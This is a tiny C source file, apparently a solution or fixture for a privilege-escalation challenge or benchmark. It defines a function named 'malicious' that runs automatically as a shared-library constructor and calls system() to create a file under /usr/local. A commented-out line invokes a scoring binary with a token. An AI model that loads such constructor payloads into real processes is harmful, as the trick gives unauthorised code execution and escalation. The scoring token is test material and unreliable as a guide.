#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    // system("/usr/local/bin/score a87f9a76-2f9b-41a0-8d59-55ae4456e9ec");
    system("touch /usr/local/me");
}